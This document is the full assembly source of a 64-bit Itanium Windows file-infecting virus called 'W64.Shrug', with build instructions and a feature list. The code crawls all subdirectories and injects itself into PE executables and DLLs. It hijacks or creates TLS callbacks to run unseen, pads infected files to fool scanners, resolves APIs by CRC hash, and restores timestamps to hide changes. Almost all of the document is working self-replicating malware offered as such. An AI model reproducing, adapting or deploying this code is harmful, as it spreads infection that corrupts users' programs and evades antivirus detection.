//W64.Shrug by roy g biv
//
//some of its features:
//- parasitic direct action infector of PE exe/dll (but not looking at suffix)
//- infects files in current directory and all subdirectories
//- directory traversal is linked-list instead of recursive to reduce stack size
//- reloc section inserter/last section appender
//- EPO (TLS infection)
//- code executes after ExitProcess() is called
//- uses CRCs instead of API names
//- uses SEH for common code exit
//- no infect files with data outside of image (eg self-extractors)
//- no infect files protected by SFC
//- infected files are padded by random amounts to confuse tail scanners
//- scans memory to find kernel address (no hard-coded addresses)
//- correct file checksum without using imagehlp.dll :) 100% correct algorithm
//---
//
//to build this thing:
//ias
//----
//ias shrug64.asm
//link shrug64.obj kernel32.lib user32.lib /section:.text,erw /entry:shrug /subsystem:console
//---
//
//We're in the middle of a phase transition:
//a butterfly flapping its wings at
//just the right moment could
//cause a storm to happen.
//-I'm trying to understand-
//I'm at a moment in my life-
//I don't know where to flap my wings.
//(Danny Hillis)

.global shrug#
.include "shrug64.inc"
.proc   shrug
shrug:  alloc                   loc0 = 0, 3, 3, 0
        mov                     out0 = 3                        //ntdcrc_count
        add                     out1 = @ltoff(ntdnames), gp
        add                     out2 = @ltoff(ntdcrcbegin), gp
        br.call.sptk.many       rp = create_crcs
        mov                     out0 = 17                       //krncrc_count
        add                     out1 = @ltoff(krnnames), gp
        add                     out2 = @ltoff(krncrcbegin), gp
        br.call.sptk.many       rp = create_crcs
        mov                     out0 = 1                        //sfccrc_count
        add                     out1 = @ltoff(sfcnames), gp
        add                     out2 = @ltoff(sfccrcbegin), gp
        add                     loc1 = @ltoff(ntdll), gp
        br.call.sptk.many       rp = create_crcs
        ld8                     out0 = [loc1]
        mov                     loc2 = gp
        br.call.sptk.many       rp = GetModuleHandleA
        mov                     gp = loc2
        mov                     ar.pfs = loc0
        mov                     r33 = 0                         //fake reason
        mov                     rp = ret0                       //fake return address

//-----------------------------------------------------------------------------
//code begins here in existing TLS callback pointer
//-----------------------------------------------------------------------------

shrug_tlscode1:
        mov                     r2 = ip

host_patch:
{
        addl                    r2 = do_message - shrug_tlscode1, r2
                                                                //must be addl, must be first in bundle
        nop.i                   0
        br.many                 shrug_common
}

ret_host:
(p2)    br.cond.sptk.few        b1
(p3)    br.ret.sptk.few         b1

        tlsdata:                data8.ua        0, 0, 0, 0, 0, 0, 0, 0, 0, 0
.align 16

//-----------------------------------------------------------------------------
//code begins here in created TLS directory / callback pointer
//-----------------------------------------------------------------------------

shrug_tlscode2:                                                 //in0, in1, in2 = DllHandle, Reason, Reserved
        mov                     r2 = rp

shrug_common:
        alloc                   loc0 = 3, 15, 7, 0              //must match init_findmz!
        mov                     loc1 = r2
        mov                     loc2 = gp
        mov                     loc3 = sp
        mov                     loc4 = rp
        cmp.ne                  p1 = 0, in1                     //execute only on PROCESS_DETACH

shrug_dllret:
(p1)    mov                     sp = loc3
(p1)    mov                     b1 = loc1
(p1)    mov                     rp = loc4
(p1)    mov                     gp = loc2
(p1)    mov                     ar.pfs = loc0
        mov                     out0 = rp
(p1)    cmp.ne                  p2, p3 = loc4, loc1
(p1)    br.cond.sptk.few        ret_host
        br.call.sptk.few        rp = init_findmz

//-----------------------------------------------------------------------------
//API CRC table, null terminated
//-----------------------------------------------------------------------------

ntdcrcbegin:
kLdrGetDllHandle               :data4.ua        0
kAddVectoredExceptionHandler   :data4.ua        0
kRemoveVectoredExceptionHandler:data4.ua        0
                                data4.ua        0
ntdcrcend:                      data4.ua        load_krn - ntdcrcend
                                string          "Shrug - roy g biv"
                                                                //your guess is as good as mine
.align 16
cLdrGetDllHandle = ((ntdcrcend - kLdrGetDllHandle - 4) << 2) + 0x20

//-----------------------------------------------------------------------------
//oversize register allocation to work around assembler bug in v6.00.2111
//bug is that assembler does not keep list of alloc, but simply uses last one
//this results in incorrect register naming for nested procedures
//-----------------------------------------------------------------------------

init_findmz:
        alloc                   loc0 = 3, 15, 7, 0              //must match shrug_common!
        mov                     loc5 = rp
        dep                     out0 = 0, in0, 0, 16            //64kb align

find_mzhdr:

//-----------------------------------------------------------------------------
//do not use hard-coded kernel address values because it is not portable
//Microsoft used all different values for 95, 98, NT, 2000, Me, XP, 2003
//they will maybe change again for every new release
//-----------------------------------------------------------------------------

        dep.z                   loc6 = -1, 16, 48
        br.call.sptk.few        rp = is_pehdr
{
.pred.rel "mutex", p1, p2
(p1)    add                     loc6 = peexport, ret0;;
(p1)    ld4                     loc6 = [loc6]
(p2)    add                     out0 = loc6, out0
}
(p1)    add                     loc6 = loc6, out0
(p2)    br.cond.sptk.few        find_mzhdr

//-----------------------------------------------------------------------------
//parse export table
//-----------------------------------------------------------------------------

        add                     loc6 = 28, loc6
        movl                    loc7 = 0x4c11db7                //use generator polymonial (see IEEE 802)
        ld4                     loc8 = [loc6], 4                //Export Address Table RVA
        ld8                     loc6 = [loc6]                   //Name Pointer Table RVA, Ordinal Table RVA
        add                     loc8 = loc8, out0
        ld4                     loc9 = [loc5], 4
        shr.u                   loc10 = loc6, 32
        extr.u                  loc6 = loc6, 0, 32
        add                     loc10 = loc10, out0
        add                     loc11 = loc6, out0
        add                     loc6 = loc6, out0

get_export:
        ld4                     loc12 = [loc6], 4
        add                     loc12 = loc12, out0             //Name Pointer VA
        or                      loc13 = -1, r0

crc_outer:
        ld1                     loc14 = [loc12], 1
        xor                     loc13 = loc13, loc14
        mov                     ar.lc = 7

crc_inner:
        tbit.nz                 p1 = loc13, 31
        shl                     loc13 = loc13, 1
(p1)    xor                     loc13 = loc13, loc7
        br.cloop.sptk.few       crc_inner
        cmp.eq                  p1, p2 = 0, loc14
(p1)    cmp4.ne                 p1 = loc13, loc9
(p2)    br.cond.sptk.few        crc_outer
(p1)    br.cond.sptk.few        get_export

//-----------------------------------------------------------------------------
//exports must be sorted alphabetically, otherwise GetProcAddress() would fail
//this allows to push addresses onto the stack, and the order is known
//-----------------------------------------------------------------------------

        ld4                     loc9 = [loc5], 4
        sub                     loc12 = loc6, loc11             //Name Pointer Table VA
        shr.u                   loc12 = loc12, 1
        cmp.eq                  p1, p2 = 0, loc9
        add                     loc12 = loc12, loc10
        add                     loc12 = -2, loc12
        ld2                     loc12 = [loc12];;               //get export ordinal
(p1)    ld4                     loc9 = [loc5]
        shladd                  loc12 = loc12, 2, loc8
        ld4                     loc12 = [loc12]                 //get export RVA
(p1)    add                     loc9 = loc9, loc5
        add                     loc12 = loc12, out0
        st8                     [sp] = loc12, -16
(p1)    mov                     rp = loc9
(p2)    br.cond.sptk.many       get_export
        br.ret.sptk.many        rp

//-----------------------------------------------------------------------------
//get imagebase of kernel32 for familiar APIs, rather than calling through ntdll
//this is required because it is ntdll that calls the TLS entrypoint
//-----------------------------------------------------------------------------

load_krn:
        mov                     out0 = 1
        mov                     out1 = 0
        add                     out2 = -8, sp
        mov                     loc5 = 0x120010
        movl                    loc6 = 0x6e00720065006b
        st8                     [out2] = sp, -8
        movl                    loc7 = 0x320033006c0065         //"kernel32" in Unicode
        st8                     [sp] = loc6, 8
        st8                     [out2] = loc5
        st8                     [sp] = loc7, -40
        mov                     loc8 = sp
        mov                     out3 = sp
        add                     r2 = cLdrGetDllHandle, sp
        st8                     [sp] = sp, -16
        br.call.sptk.few        rp = call_api
        ld8                     out0 = [loc8]
        br.call.sptk.few        rp = init_findmz

//-----------------------------------------------------------------------------
//API CRC table, null terminated
//-----------------------------------------------------------------------------

krncrcbegin:
kCloseHandle                   :data4.ua        0
kCreateFileMappingA            :data4.ua        0
kCreateFileW                   :data4.ua        0
kFindClose                     :data4.ua        0
kFindFirstFileW                :data4.ua        0
kFindNextFileW                 :data4.ua        0
kGetFullPathNameW              :data4.ua        0
kGetTickCount                  :data4.ua        0
kGlobalAlloc                   :data4.ua        0
kGlobalFree                    :data4.ua        0
kLoadLibraryA                  :data4.ua        0
kMapViewOfFile                 :data4.ua        0
kSetCurrentDirectoryA          :data4.ua        0
kSetCurrentDirectoryW          :data4.ua        0
kSetFileAttributesW            :data4.ua        0
kSetFileTime                   :data4.ua        0
kUnmapViewOfFile               :data4.ua        0
                                data4.ua        0
krncrcend:                      data4.ua        check_sfc - krncrcend
.align 16
cLoadLibraryA = (krncrcend - kLoadLibraryA - 4) << 2

//-----------------------------------------------------------------------------
//get SFC support
//-----------------------------------------------------------------------------

check_sfc:
        mov                     out0 = sp
        movl                    loc5 = 0x736f5f636673           //"sfc_os" - Windows XP/2003 (forwarder chain from sfc.dll)
        add                     r2 = cLoadLibraryA, sp
        st8                     [sp] = loc5, -16
        br.call.sptk.few        rp = call_api
        mov                     out0 = ret0
        br.call.sptk.few        rp = init_findmz

//-----------------------------------------------------------------------------
//API CRC table, null terminated
//-----------------------------------------------------------------------------

sfccrcbegin:
kSfcIsFileProtected:            data4.ua        0
                                data4.ua        0
sfccrcend:                      data4.ua        scan_dirinit - sfccrcend
.align 16
cAddVectoredExceptionHandler = ((ntdcrcend - kAddVectoredExceptionHandler - 4) << 2) + ((krncrcend - krncrcbegin - 4) << 2) + ((sfccrcend - sfccrcbegin - 4) << 2) + 0x50
cCloseHandle = ((krncrcend - kCloseHandle - 4) << 2) + 0x30
cCreateFileMappingA = ((krncrcend - kCreateFileMappingA - 4) << 2) + 0x30
cCreateFileW = ((krncrcend - kCreateFileW - 4) << 2) + 0x30
cFindClose = ((krncrcend - kFindClose - 4) << 2) + 0x30
cFindFirstFileW = ((krncrcend - kFindFirstFileW - 4) << 2) + 0x30
cFindNextFileW = ((krncrcend - kFindNextFileW - 4) << 2) + 0x30
cGetFullPathNameW = ((krncrcend - kGetFullPathNameW - 4) << 2) + 0x30
cGetTickCount = ((krncrcend - kGetTickCount - 4) << 2) + 0x30
cGlobalAlloc = ((krncrcend - kGlobalAlloc - 4) << 2) + 0x30
cGlobalFree = ((krncrcend - kGlobalFree - 4) << 2) + 0x30
cMapViewOfFile = ((krncrcend - kMapViewOfFile - 4) << 2) + 0x30
cRemoveVectoredExceptionHandler = ((ntdcrcend - kRemoveVectoredExceptionHandler - 4) << 2) + ((krncrcend - krncrcbegin - 4) << 2) + ((sfccrcend - sfccrcbegin - 4) << 2) + 0x50
cSetCurrentDirectoryA = ((krncrcend - kSetCurrentDirectoryA - 4) << 2) + 0x30
cSetCurrentDirectoryW = ((krncrcend - kSetCurrentDirectoryW - 4) << 2) + 0x30
cSetFileAttributesW = ((krncrcend - kSetFileAttributesW - 4) << 2) + 0x30
cSetFileTime = ((krncrcend - kSetFileTime - 4) << 2) + 0x30
cUnmapViewOfFile = ((krncrcend - kUnmapViewOfFile - 4) << 2) + 0x30
cSfcIsFileProtected = ((sfccrcend - kSfcIsFileProtected - 4) << 2) + 0x10

//-----------------------------------------------------------------------------
//non-recursive directory traverser
//-----------------------------------------------------------------------------

scan_dirinit:
        mov                     loc5 = sp
        add                     loc6 = -size_findlist - 0x10, sp
        mov                     loc7 = 0x2a                     //'*'
        mov                     loc8 = 0x2e2e                   //'..'
        st8                     [loc5] = loc7, -16
        st8                     [loc6] = r0                     //zero findprev in findlist
        st8                     [loc5] = loc8
        add                     sp = -16, loc6

scan_dir:
        add                     out0 = 16, loc5
        add                     out1 = finddata, loc6
        add                     r2 = cFindFirstFileW, loc5
        br.call.sptk.few        rp = call_api
        cmp.eq                  p1, p2 = -1, ret0
(p1)    br.cond.spnt.few        find_prev
        add                     loc7 = findhand, loc6
        st8                     [loc7] = ret0

        //you must always step forward from where you stand

test_dirfile:
        add                     loc7 = finddata + dwFileAttributes, loc6
        ld4                     loc7 = [loc7]
        add                     out0 = finddata + cFileName, loc6
        ld1                     loc8 = [out0]
        tbit.nz                 p1, p2 = loc7, FILE_ATTRIBUTE_DIRECTORY
(p1)    cmp.eq                  p1 = 0x2e, loc8                 //ignore . and .. (but also .* directories)
(p2)    br.cond.sptk.few        test_file
(p1)    br.cond.spnt.few        find_next

//-----------------------------------------------------------------------------
//enter subdirectory, and allocate another list node
//-----------------------------------------------------------------------------

        add                     r2 = cSetCurrentDirectoryW, loc5
        br.call.sptk.few        rp = call_api
        cmp.eq                  p1, p2 = 0, ret0
(p2)    mov                     out0 = GMEM_FIXED
(p2)    mov                     out1 = size_findlist
(p2)    add                     r2 = cGlobalAlloc, loc5
(p1)    br.cond.spnt.few        find_next
        br.call.sptk.few        rp = call_api
        cmp.eq                  p1 = 0, ret0
(p1)    br.cond.spnt.few        step_updir
        st8                     [ret0] = loc6                   //findlist.findprev
        mov                     loc6 = ret0
        br.few                  scan_dir

find_next:
        add                     out0 = findhand, loc6
        add                     out1 = finddata, loc6
        add                     r2 = cFindNextFileW, loc5
        ld8                     out0 = [out0]
        br.call.sptk.few        rp = call_api
        cmp.eq                  p1, p2 = 0, ret0
(p1)    add                     out0 = findhand, loc6
(p1)    add                     r2 = cFindClose, loc5
(p1)    ld8                     out0 = [out0]
(p2)    br.cond.sptk.few        test_dirfile

//-----------------------------------------------------------------------------
//close find, and free list node if not list head
//-----------------------------------------------------------------------------

        br.call.sptk.few        rp = call_api

find_prev:
        ld8                     loc7 = [loc6]                   //findlist.findprev
        cmp.eq                  p1, p2 = 0, loc7
(p2)    mov                     out0 = loc6
(p2)    mov                     loc6 = loc7
(p2)    add                     r2 = cGlobalFree, loc5
(p1)    br.cond.spnt.few        shrug_dllret                    //game over
        br.call.sptk.few        rp = call_api

step_updir:

//-----------------------------------------------------------------------------
//the ANSI string ".." can be used, even on Unicode platforms
//-----------------------------------------------------------------------------

        mov                     out0 = loc5
        add                     r2 = cSetCurrentDirectoryA, loc5
        br.call.sptk.few        rp = call_api
.align 16 //cannot be in same bundle
        br.few                  find_next

test_file:

//-----------------------------------------------------------------------------
//get full path
//-----------------------------------------------------------------------------

        mov                     loc10 = sp
        add                     loc9 = ((-MAX_PATH - 7) * 2) & -0x10, sp
        mov                     loc8 = out0
        mov                     out1 = MAX_PATH
        mov                     out2 = loc9
        mov                     out3 = sp
        add                     sp = -16, loc9
        add                     r2 = cGetFullPathNameW, loc5
        br.call.sptk.few        rp = call_api

//-----------------------------------------------------------------------------
//don't touch protected files
//-----------------------------------------------------------------------------

        mov                     out0 = 0
        mov                     out1 = loc9
        add                     r2 = cSfcIsFileProtected, loc5
        br.call.sptk.few        rp = call_api
        mov                     sp = loc10
        cmp.ne                  p1 = 0, ret0
(p1)    br.cond.spnt.few        find_next

//-----------------------------------------------------------------------------
//reset read-only file attribute
//-----------------------------------------------------------------------------

        mov                     out0 = loc8
        mov                     out1 = 0
        add                     r2 = cSetFileAttributesW, loc5
        br.call.sptk.few        rp = call_api
        mov                     out4 = OPEN_EXISTING
        mov                     out5 = 0
        mov                     out6 = 0
        mov                     out0 = loc8
        dep.z                   out1 = out4, 30, 2              //GENERIC_READ | GENERIC_WRITE
        mov                     out2 = 0
        mov                     out3 = 0
        add                     r2 = cCreateFileW, loc5
        br.call.sptk.few        rp = call_api
        mov                     loc9 = ret0
        mov                     out0 = loc5
        mov                     out1 = ret0
        mov                     out2 = loc6
        mov                     out3 = loc2
        br.call.sptk.many       rp = test_infect
        cmp.ne                  p1 = 0, ret0
(p1)    br.call.sptk.many       rp = infect_file                //Super Nashwan power ;)

delta_label:
        mov                     out0 = loc9
        mov                     out1 = 0
        add                     out2 = finddata + ftLastAccessTime, loc6
        add                     out3 = finddata + ftLastWriteTime, loc6
        add                     r2 = cSetFileTime, loc5
        br.call.sptk.few        rp = call_api
        mov                     out0 = loc9
        add                     r2 = cCloseHandle, loc5
        br.call.sptk.few        rp = call_api
        mov                     out0 = loc8
        mov                     out1 = loc7                     //restore original file attributes
        add                     r2 = cSetFileAttributesW, loc5
        br.call.sptk.few        rp = call_api
.align 16 //cannot be in same bundle
        br.few                  find_next
                                string          "06/05/04"      //03, 02, 01... launch on 64-bit!
.align 16
.endp   shrug

//-----------------------------------------------------------------------------
//look for MZ and PE file signatures
//-----------------------------------------------------------------------------

.proc   is_pehdr
is_pehdr:
        ld2                     r30 = [in0], mzlfanew
        mov                     r31 = 0x5a4d                    //'ZM' - Windows does not check 'MZ'
        cmp.eq                  p1, p2 = r30, r31
        ld4                     r30 = [in0], -mzlfanew
(p1)    cmp.ltu                 p1, p2 = r30, r31
(p1)    add                     ret0 = r30, in0
(p1)    ld4                     r30 = [ret0]
(p1)    mov                     r31 = 0x4550                    //'EP'
(p1)    cmp.eq                  p1, p2 = r30, r31
        br.ret.sptk.many        rp                              //if PE file, then p1 = 1, ret0 -> COFF header
.endp   is_pehdr

//-----------------------------------------------------------------------------
//test if file is infectable (not protected, PE, IA64, non-system, not infected, etc)
//-----------------------------------------------------------------------------

.proc   test_infect
test_infect:                                                    //in0 -> platform APIs, in1 = file handle, in2 -> findlist, in3 = gp
        alloc                   loc0 = 4, 17, 5, 0              //must match infect_file!
        mov                     loc1 = rp
        mov                     out0 = in0
        mov                     out1 = in1
        mov                     out2 = in2
        mov                     out3 = in3
        mov                     out4 = 0
        mov                     loc5 = 0
        br.call.sptk.many       rp = map_view
        mov                     loc6 = IMAGE_FILE_MACHINE_IA64
        mov                     loc4 = ret2
        mov                     loc3 = ret1
        mov                     loc2 = ret0
        mov                     out0 = ret0
        br.call.sptk.few        rp = is_pehdr
(p1)    add                     out0 = finddata + dwFileSizeLow, in2
(p1)    add                     loc7 = pemachine, ret0
(p1)    add                     loc8 = pesubsys, ret0
(p1)    ld2                     loc9 = [loc7], 18
(p1)    ld2                     loc10 = [loc8], 3
(p1)    add                     loc11 = pesecurity, ret0
(p1)    ld2                     loc12 = [loc7], -16
(p1)    ld1                     loc8 = [loc8]
(p1)    cmp.eq                  p1 = loc9, loc6                 //only Intel Itanium
(p1)    ld2                     loc6 = [loc7], 14

//-----------------------------------------------------------------------------
//IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
//executable file...
//-----------------------------------------------------------------------------

(p1)    mov                     loc9 = IMAGE_FILE_SYSTEM | IMAGE_FILE_UP_SYSTEM_ONLY | IMAGE_FILE_EXECUTABLE_IMAGE
(p1)    and                     loc12 = loc12, loc9
(p1)    cmp.eq                  p1 = IMAGE_FILE_EXECUTABLE_IMAGE, loc12
(p1)    ld4                     loc11 = [loc11]
(p1)    ld4                     out1 = [out0]

//-----------------------------------------------------------------------------
//the COFF magic value is not checked because Windows ignores it anyway
//IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
//-----------------------------------------------------------------------------

(p1)    cmp.geu                 p1 = IMAGE_SUBSYSTEM_WINDOWS_CUI, loc10
(p1)    cmp.leu                 p1 = IMAGE_SUBSYSTEM_WINDOWS_GUI, loc10
(p1)    ld2                     loc7 = [loc7]
(p1)    tbit.z                  p1 = loc8, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER

//-----------------------------------------------------------------------------
//avoid files which seem to contain attribute certificates
//because one of those certificates might be a digital signature
//-----------------------------------------------------------------------------

(p1)    cmp.eq                  p1 = 0, loc11

//-----------------------------------------------------------------------------
//cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
//the Optional Header can be larger than the offset of the last directory
//remember: even if you have not seen it does not mean that it does not happen :)
//-----------------------------------------------------------------------------

(p1)    add                     loc8 = pefilealign, ret0
(p1)    add                     loc7 = loc7, ret0
(p1)    shladd                  loc6 = loc6, 2, loc6            //multiply by 5
(p1)    ld4                     loc8 = [loc8]
(p1)    shladd                  loc6 = loc6, 3, loc7            //complete multiply by 28h (size pesect)
(p1)    ld4                     loc7 = [loc6], 4
(p1)    ld4                     loc9 = [loc6]
(p1)    add                     loc8 = loc8, out1
(p1)    add                     loc7 = loc9, loc7
(p1)    cmp.eq                  p1 = out1, loc7                 //file contains appended data
(p1)    st4                     [out0] = loc8
(p1)    mov                     loc5 = loc8                     //non-zero

//-----------------------------------------------------------------------------
//exception must be in M slot, since continuation occurs from same slot,
//even if IP is moved to another location
//-----------------------------------------------------------------------------

.align 16
        ld1                     ret0 = [r0]
.endp   test_infect

//-----------------------------------------------------------------------------
//increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
//-----------------------------------------------------------------------------

.proc   open_append
open_append:
        alloc                   loc0 = 5, 3, 0, 0
        mov                     loc1 = rp
        mov                     loc2 = RANDPADMAX - 1
        add                     r2 = cGetTickCount, in0
        br.call.sptk.few        rp = call_api
        mov                     rp = loc1
        and                     ret0 = loc2, ret0
        add                     in4 = shrug_codeend - shrug_tlscode1 + RANDPADMIN, ret0
        mov                     ar.pfs = loc0
.endp   open_append

//-----------------------------------------------------------------------------
//create file map, and map view if successful
//-----------------------------------------------------------------------------

.proc   map_view
map_view:                                                       //in0 -> platform APIs, in1 = file handle, in2 -> findlist, in3 = gp, in4 = extra bytes to map
        alloc                   loc0 = 5, 5, 6, 0
        mov                     out0 = ip                       //non-zero, must be in first bundle
        add                     out1 = -8, sp
        add                     r2 = cAddVectoredExceptionHandler, in0
        mov                     loc1 = rp
        add                     out0 = unmap_seh - map_view, out0;;
        st8                     [sp] = in3, -16
        st8                     [out1] = out0
        br.call.sptk.few        rp = call_api
        mov                     loc2 = ret0
        add                     out4 = finddata + dwFileSizeLow, in2
        mov                     out0 = in1
        mov                     out1 = 0
        ld4                     out4 = [out4]
        mov                     out2 = PAGE_READWRITE
        mov                     out3 = 0
        add                     out4 = out4, in4
        mov                     out5 = 0
        add                     r2 = cCreateFileMappingA, in0   //ANSI map is allowed because of no name
        mov                     loc3 = out4
        br.call.sptk.few        rp = call_api
        mov                     loc4 = ret0
        mov                     out0 = ret0
        mov                     out1 = FILE_MAP_WRITE
        mov                     out2 = 0
        mov                     out3 = 0
        mov                     out4 = loc3
        add                     r2 = cMapViewOfFile, in0
        br.call.sptk.few        rp = call_api                   //should succeed even if file cannot be opened
        mov                     ret2 = loc4
        mov                     ret1 = loc2
        mov                     rp = loc1
        mov                     ret3 = loc3
        mov                     ar.pfs = loc0
        br.ret.sptk.many        rp                              //ret0 = map view, ret1 = exception handle, ret2 = map handle, ret3 = new file size

unmap_seh:
        mov                     r31 = ip                        //must be in first bundle
        add                     in0 = 8, in0
        ld8                     in0 = [in0]
        add                     in0 = ContextRecord_StIIP, in0
        add                     r31 = unmap_view - unmap_seh, r31
        st8                     [in0] = r31
        mov                     ret0 = EXCEPTION_CONTINUE_EXECUTION
        br.ret.sptk.few         rp

unmap_view:

//-----------------------------------------------------------------------------
//hard-coded registers to work around assembler bug in v6.00.2111
//bug is that assembler does not keep list of alloc, but simply uses last one
//this results in incorrect register naming for nested procedures
//-----------------------------------------------------------------------------

        mov                     r53 = r39                       //mov out0 = loc3
        add                     r2 = cRemoveVectoredExceptionHandler, in0
        br.call.sptk.few        rp = call_api
        mov                     r53 = r38                       //mov out0 = loc2
        add                     r2 = cUnmapViewOfFile, in0
        br.call.sptk.few        rp = call_api
        mov                     r53 = r40                       //mov out0 = loc4
        add                     r2 = cCloseHandle, in0
        br.call.sptk.few        rp = call_api
        add                     sp = 16, sp
        mov                     ret0 = r41                      //mov ret0 = loc5
        mov                     rp = r37                        //mov rp = loc1
        mov                     ar.pfs = r36                    //mov ar.pfs = loc0
        br.ret.sptk.many        rp
.endp   map_view

//-----------------------------------------------------------------------------
//infect file using TLS method
//algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
//               bytes) to confuse scanners that look at end of file (also
//               infection marker)
//               if reloc table is not in last section (taken from relocation
//               field in PE header, not section name), then append to last
//               section.  otherwise, move relocs down and insert code into
//               space (to confuse people looking at end of file.  they will
//               see only relocation data and many zeroes)
//infection:     Entry Point Obscured via TLS callback function
//               if no TLS directory exists, then one will be created, with a
//               single callback function that points to this code
//               if a TLS directory exists, but no callback functions exist,
//               then a function pointer will be created that points to this
//               code
//               else if a TLS directory and callback functions exist, then the
//               first function pointer will be altered to point to this code
//-----------------------------------------------------------------------------

.proc   infect_file
infect_file:                                                    //in2 -> findlist, ret0 = map view
        alloc                   loc0 = 4, 17, 5, 0              //must match test_infect!
        mov                     loc1 = rp
        mov                     out0 = in0
        mov                     out1 = in1
        mov                     out2 = in2
        mov                     out3 = in3
        mov                     loc9 = shrug_codeend - shrug_tlscode1 - 1
        br.call.sptk.many       rp = open_append
        add                     loc5 = mzlfanew, ret0
        ld4                     loc5 = [loc5]
        mov                     loc2 = ret0
        add                     loc5 = loc5, ret0
        add                     loc6 = pesectcount, loc5
        add                     loc7 = pesectalign, loc5
        ld2                     out0 = [loc6], 14
        ld8                     loc7 = [loc7]
        mov                     loc3 = ret1
        ld2                     loc8 = [loc6], 2
        shladd                  out0 = out0, 2, out0            //multiply by 5
        shladd                  out0 = out0, 3, loc8            //complete multiply by 28h (size pesect)
        add                     out0 = out0, loc5
        ld4                     loc8 = [out0], 4
        shr.u                   loc10 = loc7, 32
        ld4                     loc11 = [out0], -4
        add                     loc12 = loc9, loc8, 1
        add                     loc10 = -1, loc10
        add                     loc12 = loc12, loc10
        andcm                   loc12 = loc12, loc10            //file align last section
        st4                     [out0] = loc12, -8

//-----------------------------------------------------------------------------
//raw size is file aligned.  virtual size is not required to be section aligned
//so if old virtual size is larger than new raw size, then size of image does
//not need to be updated, else virtual size must be large enough to cover the
//new code, and size of image is section aligned
//-----------------------------------------------------------------------------

        ld8                     loc10 = [out0]
        mov                     loc4 = ret2
        shr.u                   loc13 = loc10, 32
        cmp4.ltu                p1 = loc10, loc12
(p1)    add                     loc7 = -1, loc7
(p1)    st4                     [out0] = loc12
(p1)    mov                     loc10 = loc12
(p1)    add                     loc12 = loc13, loc12
(p1)    add                     loc12 = loc12, loc7
(p1)    andcm                   loc12 = loc12, loc7
        ld1                     loc6 = [loc6]
(p1)    add                     loc14 = peimagesize, loc5
(p1)    st4                     [loc14] = loc12

//-----------------------------------------------------------------------------
//if relocation table is not in last section, then append to last section
//otherwise, move relocations down and insert code into space
//-----------------------------------------------------------------------------

        tbit.z                  p1 = loc6, IMAGE_FILE_RELOCS_STRIPPED
(p1)    add                     loc6 = pereloc, loc5
(p1)    ld4                     loc7 = [loc6]
(p1)    add                     loc10 = loc13, loc10
(p1)    cmp4.geu                p1 = loc7, loc13
(p1)    cmp4.ltu                p1 = loc7, loc10
(p1)    add                     loc7 = loc9, loc7, 1
(p1)    st4                     [loc6] = loc7
(p1)    add                     loc6 = loc11, loc2
(p1)    add                     loc7 = loc8, loc6
(p1)    add                     loc7 = -1, loc7
(p1)    add                     loc6 = loc9, loc7, 1
        mov                     ar.lc = loc9

copy_reloc:
(p1)    ld1                     loc10 = [loc7], -1
(p1)    st1                     [loc6] = loc10, -1
(p1)    add                     loc8 = -1, loc8
(p1)    cmp.ne                  p1 = 0, loc8
(p1)    br.cond.sptk.few        copy_reloc
        add                     loc13 = loc13, loc8
        add                     loc8 = loc11, loc8
        add                     loc10 = loc2, loc8
        add                     loc6 = shrug_tlscode1 - delta_label, loc1
        ld1                     loc7 = [loc6], 1
        add                     loc8 = loc2, loc8

copy_code:
        st1                     [loc8] = loc7, 1
        ld1                     loc7 = [loc6], 1
        br.cloop.sptk.few       copy_code

//-----------------------------------------------------------------------------
//section attributes are always altered to executable because IA64 requires it
//-----------------------------------------------------------------------------

        add                     loc6 = sectflags - sectvirtsize + 3, out0
        ld1                     loc7 = [loc6]
        add                     loc8 = peimagebase, loc5
        or                      loc7 = IMAGE_SCN_MEM_EXECUTE >> 24, loc7

//-----------------------------------------------------------------------------
//if tls directory exists...
//-----------------------------------------------------------------------------

        add                     loc9 = petls, loc5
        add                     out2 = peglobal, loc5
        ld4                     loc8 = [loc8]
        ld4                     out1 = [loc9]
        cmp.eq                  p1 = 0, out1
(p1)    br.cond.sptk.few        add_tlsdir                      //size field is never checked
        br.call.sptk.few        rp = rva2raw
        add                     loc13 = loc13, loc8
        add                     loc11 = loc2, ret0
        add                     loc11 = tlsfuncptr, loc11
        ld8                     loc12 = [loc11]
        cmp.ne                  p1 = 0, loc12
(p1)    sub                     out1 = loc12, loc8
(p1)    br.call.sptk.few        rp = rva2raw
(p1)    add                     loc12 = ret0, loc2
(p1)    ld8                     loc12 = [loc12]
(p1)    sub                     out1 = loc12, loc8

        //it is impossible if it passes unattempted

        cmp.ne                  p1 = 0, loc12
(p1)    br.call.sptk.few        rp = rva2raw
(p1)    add                     loc12 = ret0, loc2
(p1)    xchg8                   loc11 = [loc12], loc13
(p1)    sub                     loc11 = loc11, loc13
(p1)    shr.u                   loc12 = loc11, 21
        add                     loc13 = tlsdata - shrug_tlscode1 + tlsfunc, loc13
(p1)    shr.u                   loc14 = loc11, 7
(p1)    shr.u                   loc15 = loc11, 16
(p1)    movl                    loc13 = 0x240004001010
        add                     loc10 = tlsdata - shrug_tlscode1 + tlsfunc, loc10
(p1)    dep                     loc13 = loc11, loc13, 18, 7
(p1)    dep                     loc14 = loc12, loc14, 9, 1
(p1)    add                     loc11 = host_patch - tlsdata - tlsfunc, loc10
(p1)    dep                     loc15 = loc14, loc15, 5, 10
(p1)    dep                     loc13 = loc15, loc13, 27, 15    //form imm22
        st8                     [loc11] = loc13
(p1)    br.cond.sptk.few        checksum_file

//-----------------------------------------------------------------------------
//section attributes are altered to writable when a TLS directory is created.
//at that time, a writable dword must be available for the index.
//the alternative is to search for a writable section with virtual size > raw
//size, set index pointer to that address and reinitialise it to zero in code
//-----------------------------------------------------------------------------

add_tlsdir:
        sub                     out1 = 0, loc8
(p1)    dep                     loc7 = 1, loc7, IMAGE_SCN_MEM_WRITE, 1
(p1)    add                     loc13 = tlsdata - shrug_tlscode1, loc13
(p1)    st8                     [loc9] = loc13
(p1)    add                     loc13 = loc13, loc8
(p1)    add                     loc13 = tlsflags - tlsrawbeg, loc13
(p1)    add                     loc10 = tlsdata - shrug_tlscode1 + tlsindex, loc10
(p1)    st8                     [loc10] = loc13, 8
(p1)    add                     loc13 = tlsfunc - tlsflags, loc13
(p1)    st8                     [loc10] = loc13, 16
        add                     loc13 = tlsfuncind - tlsfunc, loc13
        add                     out1 = out1, loc13
